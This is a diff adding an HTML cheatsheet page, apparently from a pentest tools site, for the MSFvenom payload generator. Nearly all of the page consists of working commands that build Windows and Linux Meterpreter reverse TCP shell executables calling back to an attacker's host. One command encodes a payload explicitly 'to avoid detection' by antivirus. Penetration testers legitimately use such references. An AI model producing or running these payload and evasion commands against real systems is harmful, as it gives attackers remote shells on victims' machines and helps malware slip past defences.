@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="../styles.css">
+    <link rel="icon" href="../image/favicon.ico" type="image/x-icon"/>
+    <title>MSFvenom Cheatsheet</title>
+</head>
+<body>
+    <header>
+        <h1 class="site-title">Pentest Tools</h1>
+        <div class="dropdown">
+            <a href="../tool/tool.html" class="dropbtn">Tools</a>
+        </div>
+        <div class="dropdown">
+            <a href="../Cheatsheet/cheatsheet.html" class="dropbtn">CheatSheet</a>
+        </div>
+        <div class="dropdown">
+            <a href="../index.html" class="dropbtn">Acceuil</a>
+        </div>
+        <br>
+    </header>
+    <main>
+        <h1>MSFvenom Cheatsheet</h1>
+        <div>
+            <h2>How to Install MSFvenom</h2>
+            <section>
+                <p>MSFvenom is part of the Metasploit Framework. Install Metasploit to get MSFvenom:</p>
+                <div class="terminal">
+                    <div class="terminal-title">Installation</div>
+                    <span class="prompt"><span style="color: #2ecc71;">username@machine_name</span>:<span style="color: #0074cc;">~</span><span style="color: #ffffff;">$ sudo apt install metasploit-framework</span></span>
+                </div>
+            </section>
+        </div>
+        <div>
+            <h2>Useful Commands for MSFvenom</h2>
+            <p>
+                <br>-p [payload]: Specify the payload to use
+                <br>-f [format]: Specify the output format (e.g., exe, elf, raw)
+                <br>-o [options]: List all available options for the selected payload
+                <br>-e [encoder]: Specify the encoder to use
+                <br>-i [iterations]: Specify the number of iterations for encoding
+                <br>-b [badchars]: Specify bad characters to avoid
+                <br>-a [architecture]: Specify the architecture (e.g., x86, x64)
+                <br>-p linux/x86/meterpreter/reverse_tcp: Generate a reverse TCP payload for Linux x86
+                <br>-l payloads: List available payloads
+                <br>-l encoders: List available encoders
+                <br>-l formats: List available formats
+            </p>
+        </div>
+        <div>
+            <h2>Examples of MSFvenom Commands</h2>
+            <section>
+                <p>Create a Windows reverse TCP shell payload:</p>
+                <div class="terminal">
+                    <div class="terminal-title">Windows Payload</div>
+                    <span class="prompt"><span style="color: #2ecc71;">username@machine_name</span>:<span style="color: #0074cc;">~</span><span style="color: #ffffff;">$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=[YourIP] LPORT=[YourPort] -f exe > shell.exe</span></span>
+                </div>
+            </section>
+            <br>
+            <section>
+                <p>Create a Linux reverse TCP shell payload:</p>
+                <div class="terminal">
+                    <div class="terminal-title">Linux Payload</div>
+                    <span class="prompt"><span style="color: #2ecc71;">username@machine_name</span>:<span style="color: #0074cc;">~</span><span style="color: #ffffff;">$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[YourIP] LPORT=[YourPort] -f elf > shell.elf</span></span>
+                </div>
+            </section>
+            <br>
+            <section>
+                <p>Encode a payload to avoid detection:</p>
+                <div class="terminal">
+                    <div class="terminal-title">Encode Payload</div>
+                    <span class="prompt"><span style="color: #2ecc71;">username@machine_name</span>:<span style="color: #0074cc;">~</span><span style="color: #ffffff;">$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=[YourIP] LPORT=[YourPort] -e x86/shikata_ga_nai -i 10 -f exe > encoded_shell.exe</span></span>
+                </div>
+            </section>
+            <br>
+            <section>
+                <p>Generate a payload with specified bad characters:</p>
+                <div class="terminal">
+                    <div class="terminal-title">Bad Characters</div>
+                    <span class="prompt"><span style="color: #2ecc71;">username@machine_name</span>:<span style="color: #0074cc;">~</span><span style="color: #ffffff;">$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=[YourIP] LPORT=[YourPort] -b "\x00\x0a\x0d" -f exe > no_badchars_shell.exe</span></span>
+                </div>
+            </section>
+            <br>
+            <section>
+                <p>List available payloads:</p>
+                <div class="terminal">
+                    <div class="terminal-title">List Payloads</div>
+                    <span class="prompt"><span style="color: #2ecc71;">username@machine_name</span>:<span style="color: #0074cc;">~</span><span style="color: #ffffff;">$ msfvenom -l payloads</span></span>
+                </div>
+            </section>
+            <br>
+            <section>
+                <p>List available encoders:</p>
+                <div class="terminal">
+                    <div class="terminal-title">List Encoders</div>
+                    <span class="prompt"><span style="color: #2ecc71;">username@machine_name</span>:<span style="color: #0074cc;">~</span><span style="color: #ffffff;">$ msfvenom -l encoders</span></span>
+                </div>
+            </section>
+            <br>
+        </div>
+    </main>
+</body>
+</html>
